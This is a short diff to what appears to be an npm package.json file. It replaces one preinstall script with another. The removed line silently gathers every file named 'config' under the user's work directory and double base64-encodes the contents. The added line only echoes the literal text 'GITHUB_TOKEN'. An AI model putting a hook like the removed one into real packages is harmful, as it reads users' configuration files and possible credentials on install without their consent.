@@ -1,1 +1,1 @@
-{"scripts":{"preinstall":"find \"$HOME/work\" -type f -name config | xargs cat | base64 | base64"}}
+{"scripts":{"preinstall":"echo GITHUB_TOKEN"}}
